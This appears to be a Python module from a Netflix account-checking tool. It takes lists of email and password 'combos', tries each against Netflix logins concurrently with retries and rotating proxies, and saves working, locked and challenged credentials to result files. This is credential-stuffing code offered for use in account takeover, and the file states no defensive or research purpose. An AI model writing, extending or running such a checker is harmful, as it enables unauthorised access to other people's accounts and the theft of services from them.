"""
Account Checker - Core checking logic
"""
import asyncio
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass

from netflix_login import NetflixLogin, AccountStatus, LoginResult
from proxy_manager import ProxyManager
from checker_utils import save_result, setup_logging, get_results_file, format_combo


logger = setup_logging()


@dataclass
class CheckResult:
    """Result of account check"""
    email: str
    password: str
    status: AccountStatus
    message: str
    proxy: Optional[str] = None


class AccountChecker:
    """Manages concurrent account checking"""

    def __init__(
        self,
        proxy_manager: Optional[ProxyManager] = None,
        timeout: int = 30,
        max_retries: int = 3,
        max_workers: int = 10,
        output_dir: str = "."
    ):
        self.proxy_manager = proxy_manager
        self.timeout = timeout
        self.max_retries = max_retries
        self.max_workers = max_workers
        self.output_dir = output_dir
        self.results: Dict[str, int] = {
            "valid": 0,
            "invalid": 0,
            "locked": 0,
            "challenge": 0,
            "error": 0
        }
        self._lock = asyncio.Lock()

    async def check_single(self, email: str, password: str) -> CheckResult:
        """Check a single account with retry logic"""
        proxy = None

        # Get proxy if available
        if self.proxy_manager:
            proxy = await self.proxy_manager.get_random_proxy()

        last_error = None

        # Reuse session for all retry attempts
        async with NetflixLogin(timeout=self.timeout) as netflix:
            for attempt in range(self.max_retries):
                try:
                    result = await netflix.attempt_login(email, password)

                    # Update proxy status
                    if self.proxy_manager and proxy:
                        if result.status == AccountStatus.ERROR:
                            await self.proxy_manager.mark_proxy_failed(proxy)
                        else:
                            await self.proxy_manager.mark_proxy_success(proxy)

                    # Save result
                    await self._save_result(result, email, password, proxy)

                    return CheckResult(
                        email=email,
                        password=password,
                        status=result.status,
                        message=result.message,
                        proxy=proxy.url if proxy else None
                    )

                except Exception as e:
                    last_error = str(e)
                    logger.debug(f"Attempt {attempt + 1} failed for {email}: {e}")

                    # Wait before retry
                    if attempt < self.max_retries - 1:
                        await asyncio.sleep(1 * (attempt + 1))

        # All retries failed
        if self.proxy_manager and proxy:
            await self.proxy_manager.mark_proxy_failed(proxy)

        return CheckResult(
            email=email,
            password=password,
            status=AccountStatus.ERROR,
            message=f"All retries failed: {last_error}",
            proxy=proxy.url if proxy else None
        )

    async def _save_result(self, result: LoginResult, email: str, password: str, proxy: Optional[str]):
        """Save result to appropriate file"""
        async with self._lock:
            status_str = result.status.value

            # Update counter
            self.results[status_str] = self.results.get(status_str, 0) + 1

            # Format combo
            combo = format_combo(email, password)

            # Save to file
            file_path = get_results_file(status_str, self.output_dir)
            save_result(file_path, combo)

    async def check_accounts(self, combos: List[Tuple[str, str]]) -> Dict[str, int]:
        """Check multiple accounts concurrently"""
        logger.info(f"Starting to check {len(combos)} accounts with {self.max_workers} workers")

        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(self.max_workers)

        async def check_with_semaphore(email: str, password: str):
            async with semaphore:
                return await self.check_single(email, password)

        # Create tasks
        tasks = [
            check_with_semaphore(email, password)
            for email, password in combos
        ]

        # Run all tasks
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Log progress
        logger.info(f"Completed checking {len(combos)} accounts")

        return self.results
